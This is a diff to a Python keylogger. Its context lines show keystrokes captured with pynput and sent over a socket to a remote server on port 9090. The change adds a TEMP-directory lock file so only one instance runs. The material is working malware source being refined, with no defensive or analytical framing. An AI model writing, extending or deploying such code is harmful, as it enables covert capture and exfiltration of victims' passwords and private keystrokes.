@@ -2,6 +2,8 @@ from pynput.keyboard import Listener
 import socket
 import threading
 import time
+import os
+import sys
 
 SERVER = ''
 PORT = 9090
@@ -42,6 +44,18 @@ def start_listener():
     listener_thread.start()
     listener_active = True
 
+# Path to a lock file
+lock_file_path = os.path.join(os.getenv('TEMP'), 'myapp.lock')
+
+# Check if the lock file already exists
+if os.path.exists(lock_file_path):
+    print("An instance is already running.")
+    sys.exit(0)
+else:
+    # Create a lock file to signal that the instance is running
+    with open(lock_file_path, 'w') as f:
+        f.write("Running")
+
 while True:
     if not listener_active:
         start_listener()
@@ -50,3 +64,4 @@ while True:
         send_keystrokes(keystrokes)
         # Clear the in-memory keystrokes after sending
         keystrokes = []
+
